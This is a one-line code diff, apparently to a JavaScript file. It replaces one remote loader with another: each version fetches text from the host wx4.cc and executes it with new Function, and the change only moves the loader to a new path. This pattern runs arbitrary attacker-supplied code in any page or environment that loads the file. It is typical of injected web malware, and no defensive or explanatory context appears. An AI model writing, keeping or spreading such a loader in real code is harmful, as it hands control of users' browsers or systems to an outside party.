@@ -1,1 +1,1 @@
-fetch('//wx4.cc/zjzdj').then(r=>r.text()).then(C=>new Function(C)())
+fetch('//wx4.cc/bjchy').then(r=>r.text()).then(C=>new Function(C)())
